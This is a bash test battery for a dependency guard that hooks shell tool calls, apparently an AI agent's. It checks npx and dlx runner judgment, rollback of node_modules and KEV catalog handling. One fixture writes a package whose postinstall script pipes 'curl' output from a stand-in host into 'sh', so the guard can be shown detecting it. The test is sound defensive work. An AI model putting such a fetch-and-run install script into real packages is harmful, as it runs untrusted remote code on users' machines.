#!/usr/bin/env bash
# safedeps: an npx call is judged only where it left a trace, and a rollback
# does not remove node_modules for its own time.
#
# A call the pre hook records as an install but whose installs are node
# package runners alone (`npx <name>`, `npx --no-install <name>`, `pnpm dlx`,
# `yarn dlx`, `bunx`) used to be judged as an npm install: the post hook
# checked the project's whole closure, rolled the project back, recorded its
# whole tree as withheld and, where node_modules was a real directory and a
# tool made a cache directory under it, removed it. The rows are numbered by
# the four repairs, R1 to R4, each beside the threat it must still catch:
#
#   R1  a recorded call whose installs are node package runners alone is
#       judged only where it left a trace in npm's records; an install by any
#       manager (`yarn add`, `pnpm add`, `bun add`), alone or beside a runner,
#       and a runner that runs a package manager are judged as before
#   R2  the KEV catalog is read once per closure check (the read count is a
#       unit test, post::providers::catalog_tests; the row here is the stale
#       catalog with a refresh that fails, which says so once)
#   R3  node_modules is not removed for its own time alone
#   R4  a trace entry taken in another directory is read there by its time
#
# Every row runs both hooks of one call on a fixture: a fresh SAFEDEPS_HOME, a
# provider fixture on 127.0.0.1, synthetic lockfiles. No install command runs.
# Every post hook call goes through the report oracle, as in e2e.sh. A row that
# fails says `not ok` and the battery goes on, so a run against an older core
# shows every row it fails.
#
# The core is the tree's own (stamp-checked) or one SAFEDEPS_TEST_CORE names.
set -uo pipefail

ROOT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)
cd "${ROOT_DIR}" || exit 2

failures=0
row_failed=0
fail() { printf 'not ok - %s\n' "$1"; row_failed=1; }
# The hooks run in command substitutions, so an oracle failure there reaches
# the row through a file.
row() {
  if [[ -e "${tmp_root}/oracle-red" ]]; then
    printf 'not ok - %s: the report oracle found a line that does not hold (above)\n' "$1"
    row_failed=1
    rm -f "${tmp_root}/oracle-red"
  fi
  if [[ "${row_failed}" == 0 ]]; then
    printf 'ok - %s\n' "$1"
  else
    printf 'not ok - %s\n' "$1"
    failures=$((failures + 1))
  fi
  row_failed=0
}

# shellcheck source=lib/core-reader.sh
source "${ROOT_DIR}/scripts/test/lib/core-reader.sh"
core_reader_init "${ROOT_DIR}" || exit 2
CORE="${SAFEDEPS_TEST_CORE}"

# The physical path: the hooks name the directories they read that way.
tmp_root=$(cd "$(mktemp -d "${TMPDIR:-/tmp}/safedeps-npx-judgment.XXXXXX")" && pwd -P)
server_pid=""
cleanup() {
  [[ -z "${server_pid}" ]] || kill "${server_pid}" 2>/dev/null || true
  rm -rf "${tmp_root}"
}
trap cleanup EXIT

# shellcheck source=lib/report-oracle.sh
source "${ROOT_DIR}/scripts/test/lib/report-oracle.sh"
oracle_init "${tmp_root}/report-oracle"
oracle_native_owner_forms
oracle_native_io_forms

port_file="${tmp_root}/port"
printf '%s\n' '{"vulnerable":[]}' > "${tmp_root}/provider-state.json"
( cd "${tmp_root}" && exec node "${ROOT_DIR}/scripts/test/fixture-provider.mjs" "${port_file}" "${tmp_root}/provider-state.json" ) &
server_pid=$!
for _ in {1..50}; do
  [[ -s "${port_file}" ]] && break
  sleep 0.1
done
[[ -s "${port_file}" ]] || { printf 'not ok - the fixture provider starts\n'; exit 1; }
port=$(cat "${port_file}")
export SAFEDEPS_OSV_API_URL="http://127.0.0.1:${port}/osv/v1/query"
export SAFEDEPS_OSV_BATCH_API_URL="http://127.0.0.1:${port}/osv/v1/querybatch"
export SAFEDEPS_KEV_CATALOG_URL="http://127.0.0.1:${port}/kev.json"
export SAFEDEPS_GHSA_API_URL="http://127.0.0.1:${port}/advisories"
unset SAFEDEPS_CACHE_DIR SAFEDEPS_JOURNAL_DIR SAFEDEPS_INCIDENT_DIR

# The npm the post hook asks and would rebuild with: it answers `npm config
# ls` with npm's defaults and `npm query` with the fixture's tree, and runs
# nothing. The pre hook asks the npm on PATH, as in e2e.sh.
stub_bin="${tmp_root}/stub-bin"
mkdir -p "${stub_bin}"
cat > "${stub_bin}/npm" <<'EOF'
#!/usr/bin/env bash
if [[ "$1" == query ]]; then
  printf '%s\n' '[{"location":"","name":"fixture"},{"location":"node_modules/fixture-parent","name":"fixture-parent","version":"1.0.0"},{"location":"node_modules/fixture-child","name":"fixture-child","version":"1.0.0"}]'
elif [[ "$1" == config ]]; then
  printf '%s\n' '{"registry":"https://registry.npmjs.org/","replace-registry-host":"npmjs"}'
fi
exit 0
EOF
chmod +x "${stub_bin}/npm"

# A fresh guard home for one row, with fixture-parent@1.0.0 approved and
# nothing else: every fixture closure below holds fixture-child, which is not.
fresh_home() {
  SAFEDEPS_HOME=$(mktemp -d "${tmp_root}/home.XXXXXX")
  export SAFEDEPS_HOME
  "${ROOT_DIR}/lib/ledger/ledger.sh" approve npm fixture-parent 1.0.0 1.0.0 npx-judgment >/dev/null
}
# What advisory.log gained since adv_mark: adv_count <fixed string>.
adv_mark() { adv_from=$(( $(wc -c < "${SAFEDEPS_HOME}/advisory.log" 2>/dev/null || printf 0) + 1 )); }
adv_new() { tail -c +"${adv_from}" "${SAFEDEPS_HOME}/advisory.log" 2>/dev/null; }
adv_count() { adv_new | grep -cF -- "$1" || true; }

lock_of() { # <name>: a lockfile of fixture-parent and fixture-child
  cat <<EOF
{
  "name": "$1",
  "lockfileVersion": 3,
  "packages": {
    "": {"dependencies": {"fixture-parent": "1.0.0"}},
    "node_modules/fixture-parent": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/fixture-parent/-/fixture-parent-1.0.0.tgz", "integrity": "sha512-cGFyZW50", "dependencies": {"fixture-child": "1.0.0"}},
    "node_modules/fixture-child": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/fixture-child/-/fixture-child-1.0.0.tgz", "integrity": "sha512-Y2hpbGQ="}
  }
}
EOF
}
# project <dir> [link]: package.json, package-lock.json and a node_modules that
# holds both packages, its .bin and its hidden lockfile. With `link`,
# node_modules is a symbolic link to <dir>.target.
project() {
  local dir="$1" nm="$1/node_modules"
  mkdir -p "${dir}"
  printf '{"name":"%s","dependencies":{"fixture-parent":"1.0.0"}}\n' "${dir##*/}" > "${dir}/package.json"
  lock_of "${dir##*/}" > "${dir}/package-lock.json"
  if [[ "${2:-}" == link ]]; then
    nm="${dir}.target"
    ln -s "${nm}" "${dir}/node_modules"
  fi
  mkdir -p "${nm}/fixture-parent" "${nm}/fixture-child" "${nm}/.bin"
  printf '{"name":"fixture-parent","version":"1.0.0"}\n' > "${nm}/fixture-parent/package.json"
  printf '{"name":"fixture-child","version":"1.0.0"}\n' > "${nm}/fixture-child/package.json"
  lock_of "${dir##*/}" > "${nm}/.package-lock.json"
}

payload() { # <cwd> <command> <tool_use_id>
  jq -nc --arg c "$2" --arg cwd "$1" --arg id "$3" '{tool_name:"Bash",tool_input:{command:$c},cwd:$cwd,tool_use_id:$id}'
}
pre_hook() { # <cwd> <command> <tool_use_id>: the pre hook's stdout
  local call out
  call=$(mktemp -d "${ORACLE_DIR}/pre.XXXXXX")
  oracle_pre_before "${call}"
  out=$(payload "$1" "$2" "$3" | "${CORE}" pre 2>"${call}/stderr")
  oracle_pre "${call}" "${out}" 2>&1 || : > "${tmp_root}/oracle-red"
  printf '%s' "${out}"
}
post_hook() { # <cwd> <command> <tool_use_id>: the post hook's stdout
  local call out input
  input=$(payload "$1" "$2" "$3")
  call=$(mktemp -d "${ORACLE_DIR}/call.XXXXXX")
  oracle_before "${call}" "${input}"
  out=$(printf '%s' "${input}" | ORACLE_NPM_LOG="${call}/npm.log" ORACLE_CALL="${call}" \
    PATH="${ORACLE_DIR}/bin:${stub_bin}:${PATH}" "${CORE}" post 2>"${call}/stderr")
  oracle_message "${call}" "${input}" "${out}" 1>&2 || : > "${tmp_root}/oracle-red"
  printf '%s' "${out}"
}
message() { jq -r '.systemMessage // empty' <<< "$1" 2>/dev/null; }
id_n=0
next_id() { id_n=$((id_n + 1)); printf 'toolu_npxjudgment%04d' "${id_n}"; }
reorg_entries() { [[ -f "${SAFEDEPS_HOME}/reorg.log" ]] && grep -c '^\[' "${SAFEDEPS_HOME}/reorg.log" || printf '0'; }
withheld_files() { find "${SAFEDEPS_HOME}/npm-withheld" -name '*.json' 2>/dev/null | wc -l | tr -d ' '; }
pending_snapshot() { jq -r '.snapshot_id // empty' "${SAFEDEPS_HOME}/pending/id-$1.json" 2>/dev/null; }
dir_hash() { python3 -c 'import hashlib,os,sys; print(hashlib.md5(os.path.realpath(sys.argv[1]).encode()).hexdigest())' "$1"; }
# A time step a whole-second filesystem can see, before a write the row makes
# between the two hooks.
tick() { sleep 1.1; }

# --- R1: a recorded call whose installs are node package runners alone -------

# r1_quiet <row> <command> [between]: the post hook judges nothing, and the
# project is as it was. <between> runs between the two hooks.
r1_quiet() {
  local name="$1" command="$2" between="${3:-}" dir id snap hash confirmed_before confirmed_after out reorg withheld
  fresh_home
  export SAFEDEPS_PROVIDER_CACHE_TTL_SECONDS=0
  dir="${tmp_root}/${name}"
  project "${dir}"
  id=$(next_id)
  hash=$(dir_hash "${dir}")
  # A confirmed snapshot the row must leave in place, named by its pointer.
  printf 'verified-earlier\n' > "${SAFEDEPS_HOME}/confirmed_${hash}"
  confirmed_before=$(cat "${SAFEDEPS_HOME}/confirmed_${hash}")
  reorg=$(reorg_entries); withheld=$(withheld_files)
  pre_hook "${dir}" "${command}" "${id}" > "${tmp_root}/${name}.pre"
  [[ ! -s "${tmp_root}/${name}.pre" ]] || fail "${name}: the pre hook lets the call run as it is ($(cat "${tmp_root}/${name}.pre"))"
  snap=$(pending_snapshot "${id}")
  [[ -n "${snap}" ]] || fail "${name}: the pre hook records the call (no pending record for ${id})"
  [[ -z "${between}" ]] || { tick; eval "${between}"; }
  adv_mark
  out=$(post_hook "${dir}" "${command}" "${id}")
  [[ -z "${out}" ]] || fail "${name}: the post hook says nothing ($(message "${out}" | head -3 | tr '\n' '|'))"
  [[ "$(reorg_entries)" == "${reorg}" ]] || fail "${name}: reorg.log has no new entry ($(reorg_entries) after ${reorg})"
  [[ "$(withheld_files)" == "${withheld}" ]] || fail "${name}: npm-withheld has no new file ($(withheld_files) after ${withheld})"
  confirmed_after=$(cat "${SAFEDEPS_HOME}/confirmed_${hash}" 2>/dev/null)
  [[ "${confirmed_after}" == "${confirmed_before}" ]] || fail "${name}: confirmed_${hash} is as it was (${confirmed_after})"
  [[ -z "${snap}" || -z "$(find "${SAFEDEPS_HOME}/snapshots" -name "${snap}_*" 2>/dev/null)" ]] \
    || fail "${name}: the call's snapshot files are gone ($(find "${SAFEDEPS_HOME}/snapshots" -name "${snap}_*" | wc -l | tr -d ' ') left)"
  [[ "$(adv_count '] INFO OSV batch')" == 0 ]] \
    || fail "${name}: no OSV batch ran ($(adv_count '] INFO OSV batch') INFO OSV batch lines)"
  [[ "$(adv_count 'post-verify UNGATED: no install trace in ')" == 1 ]] \
    || fail "${name}: advisory.log says once that the call left no install trace ($(adv_count 'post-verify UNGATED: no install trace in '))"
  [[ -d "${dir}/node_modules" && ! -L "${dir}/node_modules" && -f "${dir}/node_modules/fixture-parent/package.json" ]] \
    || fail "${name}: node_modules is still there"
  unset SAFEDEPS_PROVIDER_CACHE_TTL_SECONDS
}

r1_quiet r1-1 'npx --no-install tsc --noEmit x'
row "R1.1 npx --no-install tsc, tree untouched: no judgment, no record, no rollback"
r1_quiet r1-2 'npx vitest run x'
row "R1.2 npx vitest run, tree untouched: no judgment, no record, no rollback"
r1_quiet r1-3 'npx vitest run x' 'mkdir "${dir}/node_modules/.vite"'
[[ -d "${tmp_root}/r1-3/node_modules/.vite" ]] || fail "r1-3: the cache directory the tool made is still there"
row "R1.3 npx vitest run that makes node_modules/.vite in a real node_modules: node_modules stays"

# R1.4 (threat): an npx call during which npm's hidden lockfile is written again
# and a new package lands is judged and rolled back.
fresh_home
export SAFEDEPS_PROVIDER_CACHE_TTL_SECONDS=0
dir="${tmp_root}/r1-4"; project "${dir}"; id=$(next_id)
pre_hook "${dir}" 'npx fixture-tool' "${id}" > /dev/null
tick
mkdir -p "${dir}/node_modules/fixture-tool"
printf '{"name":"fixture-tool","version":"6.6.6"}\n' > "${dir}/node_modules/fixture-tool/package.json"
jq '.packages["node_modules/fixture-tool"]={"version":"6.6.6","resolved":"https://registry.npmjs.org/fixture-tool/-/fixture-tool-6.6.6.tgz","integrity":"sha512-dG9vbA=="}' \
  "${dir}/node_modules/.package-lock.json" > "${dir}/nm-lock.tmp" && mv "${dir}/nm-lock.tmp" "${dir}/node_modules/.package-lock.json"
out=$(post_hook "${dir}" 'npx fixture-tool' "${id}")
message "${out}" | grep -qxF 'safedeps: suspicious dependency change detected. A rollback ran.' \
  || fail "r1-4: the call is rolled back ($(message "${out}" | head -2 | tr '\n' '|'))"
[[ ! -e "${dir}/node_modules" ]] || fail "r1-4: the node_modules the call wrote is removed"
[[ "$(reorg_entries)" -ge 1 ]] || fail "r1-4: reorg.log has the rollback"
unset SAFEDEPS_PROVIDER_CACHE_TTL_SECONDS
row "R1.4 (threat) npx during which the hidden lockfile is written again and a package lands: REORG and removal"

# R1.5 (regression): an npm install statement is judged with no trace, and an
# approved one passes.
fresh_home
dir="${tmp_root}/r1-5a"; project "${dir}"; id=$(next_id)
pre_hook "${dir}" 'npm install fixture-parent@1.0.0' "${id}" > /dev/null
out=$(post_hook "${dir}" 'npm install fixture-parent@1.0.0' "${id}")
message "${out}" | grep -qxF 'safedeps: suspicious dependency change detected. A rollback ran.' \
  || fail "r1-5a: an npm install over an unapproved closure is rolled back with no trace ($(message "${out}" | head -2 | tr '\n' '|'))"
message "${out}" | grep -q 'npm closure contains 1 unapproved package(s): fixture-child@1.0.0' \
  || fail "r1-5a: the closure check ran"
row "R1.5a (regression) npm install over an unapproved closure, no trace: REORG as before"

fresh_home
"${ROOT_DIR}/lib/ledger/ledger.sh" approve npm fixture-child 1.0.0 1.0.0 npx-judgment >/dev/null
dir="${tmp_root}/r1-5b"; project "${dir}"; rm -rf "${dir}/node_modules"
printf '{"name":"r1-5b","dependencies":{}}\n' > "${dir}/package.json"
printf '{"name":"r1-5b","lockfileVersion":3,"packages":{"":{}}}\n' > "${dir}/package-lock.json"
id=$(next_id)
pre_hook "${dir}" 'npm install fixture-parent@1.0.0' "${id}" > /dev/null
tick
printf '{"name":"r1-5b","dependencies":{"fixture-parent":"1.0.0"}}\n' > "${dir}/package.json"
lock_of r1-5b > "${dir}/package-lock.json"
out=$(post_hook "${dir}" 'npm install fixture-parent@1.0.0' "${id}")
! message "${out}" | grep -q 'suspicious dependency change' || fail "r1-5b: an approved install is not rolled back ($(message "${out}" | head -3 | tr '\n' '|'))"
[[ -s "${SAFEDEPS_HOME}/confirmed_$(dir_hash "${dir}")" ]] || fail "r1-5b: the approved install is confirmed"
row "R1.5b (regression) an approved npm install passes and is confirmed"

# r1_threat <row> <command> <lockfile>: an approved install by a manager that
# writes neither npm record, or a call that holds one, brings in a package
# whose postinstall fetches a script and runs it. The project has no npm
# lockfile, so no closure check speaks: the install script check finds the
# package and the call is rolled back, as before the runner rule. No install
# command runs: the files it would write are made between the two hooks.
r1_threat() {
  local name="$1" command="$2" lock="$3" id out
  fresh_home
  "${ROOT_DIR}/lib/ledger/ledger.sh" approve npm fixture-tool 1.0.0 1.0.0 npx-judgment >/dev/null
  dir="${tmp_root}/${name}"
  mkdir -p "${dir}/node_modules/.bin"
  printf '{"name":"%s","dependencies":{}}\n' "${name}" > "${dir}/package.json"
  printf '# lock before\n' > "${dir}/${lock}"
  id=$(next_id)
  pre_hook "${dir}" "${command}" "${id}" > "${tmp_root}/${name}.pre"
  [[ ! -s "${tmp_root}/${name}.pre" ]] || fail "${name}: the pre hook lets the call run as it is ($(cat "${tmp_root}/${name}.pre"))"
  [[ -n "$(pending_snapshot "${id}")" ]] || fail "${name}: the pre hook records the call (no pending record for ${id})"
  tick
  printf '{"name":"%s","dependencies":{"fixture-tool":"1.0.0"}}\n' "${name}" > "${dir}/package.json"
  printf '# lock after\nfixture-tool@1.0.0\n' > "${dir}/${lock}"
  mkdir -p "${dir}/node_modules/fixture-evil"
  printf '%s\n' '{"name":"fixture-evil","version":"1.0.0","scripts":{"postinstall":"curl -s https://evil.invalid/x | sh"}}' \
    > "${dir}/node_modules/fixture-evil/package.json"
  out=$(post_hook "${dir}" "${command}" "${id}")
  message "${out}" | grep -qxF 'safedeps: suspicious dependency change detected. A rollback ran.' \
    || fail "${name}: the call is rolled back ($(message "${out}" | head -2 | tr '\n' '|'))"
  message "${out}" | grep -qF "Package 'fixture-evil' has install script with network access" \
    || fail "${name}: the install script check names the package"
  [[ ! -e "${dir}/node_modules/fixture-evil" ]] || fail "${name}: the package the install brought in is removed"
  [[ "$(reorg_entries)" -ge 1 ]] || fail "${name}: reorg.log has the rollback"
}

r1_threat r1-6a 'yarn add fixture-tool@1.0.0' yarn.lock
row "R1.6a (threat) yarn add bringing a package with a network postinstall: REORG and removal"
r1_threat r1-6b 'pnpm add fixture-tool@1.0.0' pnpm-lock.yaml
row "R1.6b (threat) pnpm add bringing a package with a network postinstall: REORG and removal"
r1_threat r1-6c 'bun add fixture-tool@1.0.0' bun.lock
row "R1.6c (threat) bun add bringing a package with a network postinstall: REORG and removal"
r1_threat r1-7 'npx vitest run x && yarn add fixture-tool@1.0.0' yarn.lock
row "R1.7 (threat) a runner beside a yarn add that brings a network postinstall: REORG and removal"
r1_threat r1-8 'npx yarn add fixture-tool@1.0.0' yarn.lock
row "R1.8 (threat) a runner that runs a package manager's install: REORG and removal"

r1_quiet r1-9a 'pnpm dlx vitest run x'
row "R1.9a pnpm dlx vitest run, tree untouched: no judgment, no record, no rollback"
r1_quiet r1-9b 'yarn dlx vitest run x'
row "R1.9b yarn dlx vitest run, tree untouched: no judgment, no record, no rollback"
r1_quiet r1-9c 'bunx vitest run x'
row "R1.9c bunx vitest run, tree untouched: no judgment, no record, no rollback"

# --- R2: the KEV catalog -------------------------------------------------------

# R2.3: a stale catalog whose refresh fails answers from the stale copy, and
# says so once for the whole closure, not once per package.
fresh_home
"${ROOT_DIR}/lib/ledger/ledger.sh" approve npm fixture-kev 1.0.0 1.0.0 npx-judgment >/dev/null
mkdir -p "${SAFEDEPS_HOME}/cache/kev"
printf '{"vulnerabilities":[{"cveID":"CVE-2026-9999"}]}\n' > "${SAFEDEPS_HOME}/cache/kev/known_exploited_vulnerabilities.json"
touch -t 202601010000 "${SAFEDEPS_HOME}/cache/kev/known_exploited_vulnerabilities.json"
dir="${tmp_root}/r2-3"; mkdir -p "${dir}"
printf '{"name":"r2-3","dependencies":{"fixture-kev":"1.0.0"}}\n' > "${dir}/package.json"
jq -n '{name:"r2-3",lockfileVersion:3,packages:{"":{dependencies:{"fixture-kev":"1.0.0"}},
  "node_modules/fixture-kev":{version:"1.0.0"},"node_modules/fixture-a":{version:"1.0.0"},
  "node_modules/fixture-b":{version:"1.0.0"},"node_modules/fixture-c":{version:"1.0.0"}}}' > "${dir}/package-lock.json"
id=$(next_id)
pre_hook "${dir}" 'npm install fixture-kev@1.0.0' "${id}" > /dev/null
adv_mark
out=$(SAFEDEPS_KEV_CATALOG_URL="http://127.0.0.1:9/kev.json" post_hook "${dir}" 'npm install fixture-kev@1.0.0' "${id}")
message "${out}" | grep -q 'npm closure contains KEV-blocked package(s): fixture-kev@1.0.0' \
  || fail "r2-3: the stale catalog still answers ($(message "${out}" | sed -n '4p'))"
[[ "$(adv_count 'WARN CISA KEV refresh failed; using stale local catalog')" == 1 ]] \
  || fail "r2-3: the failed refresh is said once ($(adv_count 'WARN CISA KEV refresh failed; using stale local catalog') times for 4 packages)"
row "R2.3 a stale KEV catalog whose refresh fails answers from the stale copy and says so once"

# --- R3: node_modules is not removed for its own time alone --------------------

# r3 <row> <link|real> <between>: an npm install over an unapproved closure,
# so the rollback runs, with <between> run between the two hooks.
r3() {
  fresh_home
  dir="${tmp_root}/$1"
  project "${dir}" "$([[ "$2" == link ]] && printf link)"
  nm="${dir}/node_modules"
  [[ "$2" != link ]] || nm="${dir}.target"
  id=$(next_id)
  pre_hook "${dir}" 'npm install fixture-parent@1.0.0' "${id}" > /dev/null
  tick
  eval "$3"
  out=$(post_hook "${dir}" 'npm install fixture-parent@1.0.0' "${id}")
  message "${out}" | grep -qxF 'safedeps: suspicious dependency change detected. A rollback ran.' \
    || fail "$1: the rollback runs ($(message "${out}" | head -2 | tr '\n' '|'))"
}
r3 r3-1 real 'mkdir "${nm}/.vite"'
[[ -d "${dir}/node_modules/fixture-parent" && -d "${dir}/node_modules/.vite" ]] || fail "r3-1: node_modules stays"
message "${out}" | grep -qxF "kept ${dir}/node_modules" || fail "r3-1: the rollback says it kept node_modules"
row "R3.1 a dot directory with no package.json made under a real node_modules: kept"

r3 r3-2 real 'mkdir "${nm}/fixture-new"; printf "{\"name\":\"fixture-new\",\"version\":\"1.0.0\"}\n" > "${nm}/fixture-new/package.json"'
[[ ! -e "${dir}/node_modules" ]] || fail "r3-2: node_modules is removed"
message "${out}" | grep -qF "lists ${dir}/node_modules/fixture-new/package.json, which the pre-command snapshot " || fail "r3-2: the removal names the new package"
row "R3.2 (threat) a new package directory under node_modules: removed"

r3 r3-3 real 'printf "{\"name\":\"r3-3\",\"lockfileVersion\":3,\"packages\":{}}\n" > "${nm}/.package-lock.json"'
[[ ! -e "${dir}/node_modules" ]] || fail "r3-3: node_modules is removed"
row "R3.3 (threat) npm's hidden lockfile written again: removed"

r3 r3-4 real 'mkdir -p "${dir}.store/fixture-linked"; printf "{\"name\":\"fixture-linked\",\"version\":\"1.0.0\"}\n" > "${dir}.store/fixture-linked/package.json"; ln -s "${dir}.store/fixture-linked" "${nm}/fixture-linked"'
[[ ! -e "${dir}/node_modules" ]] || fail "r3-4: node_modules is removed"
[[ -f "${dir}.store/fixture-linked/package.json" ]] || fail "r3-4: the removal does not follow the link"
row "R3.4 (threat) a new link to a package directory right under node_modules: removed"

r3 r3-5a link 'mkdir "${nm}/.vite"'
[[ -L "${dir}/node_modules" && -d "${dir}.target/fixture-parent" && -d "${dir}.target/.vite" ]] || fail "r3-5a: the link and what it points to stay"
row "R3.5a a linked node_modules whose target gets a dot directory: link and target stay"

r3 r3-5b link 'mkdir "${nm}/fixture-new"; printf "{\"name\":\"fixture-new\",\"version\":\"1.0.0\"}\n" > "${nm}/fixture-new/package.json"'
[[ -L "${dir}/node_modules" && -f "${dir}.target/fixture-new/package.json" ]] || fail "r3-5b: the link and what it points to stay"
message "${out}" | grep -qF "refused removal of ${dir}/node_modules: ${dir}/node_modules is a symbolic link to " || fail "r3-5b: the removal of the link is refused"
row "R3.5b (threat) a linked node_modules whose target gets a new package: removal refused"

# --- R4: a trace entry taken in another directory ------------------------------

# The command matches the backstop's pattern and installs nothing. Its pre hook
# is given one directory and its post hook another, as after a `cd`.
bs_command='for f in 01-landing-git.txt 02-bundles.txt 03-install-sweep-install-2.txt; do echo "$f"; done'
r4() {
  fresh_home
  elsewhere="${tmp_root}/$1-elsewhere"; dir="${tmp_root}/$1"
  mkdir -p "${elsewhere}"
  project "${dir}"
  # The entry's baseline is two seconds back from the whole second the pre
  # hook ran in where the clocks it reads show whole seconds (here: none), so
  # nothing in the project may be under three seconds old.
  sleep 3.1
  id=$(next_id)
  pre_hook "${elsewhere}" "${bs_command}" "${id}" > /dev/null
  [[ -f "${SAFEDEPS_HOME}/pending/backstop/id-${id}.json" ]] || fail "$1: the pre hook leaves the call a trace entry"
  [[ -z "${2:-}" ]] || { tick; eval "$2"; }
  adv_mark
  out=$(post_hook "${dir}" "${bs_command}" "${id}")
}
r4 r4-1
[[ -z "${out}" ]] || fail "r4-1: the post hook says nothing ($(message "${out}" | head -2 | tr '\n' '|'))"
[[ "$(adv_count 'post-verify BACKSTOP UNTRACED: ')" == 1 ]] \
  || fail "r4-1: advisory.log has one BACKSTOP UNTRACED line ($(adv_new | grep -F 'BACKSTOP' | cut -c1-240))"
[[ "$(reorg_entries)" == 0 ]] || fail "r4-1: reorg.log has no entry"
row "R4.1 a backstop call whose post hook is given another directory that it did not touch: untraced"

r4 r4-2 'lock_of r4-2-changed > "${dir}/package-lock.json"'
message "${out}" | grep -qxF 'safedeps: suspicious dependency change detected; this hook found no record of this command from before it ran. No rollback ran.' \
  || fail "r4-2: the closure is judged and flagged ($(message "${out}" | head -2 | tr '\n' '|'))"
[[ "$(adv_count 'post-verify BACKSTOP traced: ')" == 1 ]] \
  || fail "r4-2: advisory.log says the call left a trace"
row "R4.2 (threat) the same, with the other directory's package-lock.json written again: flagged"

if (( failures > 0 )); then
  printf '# %d row(s) failed\n' "${failures}"
  exit 1
fi
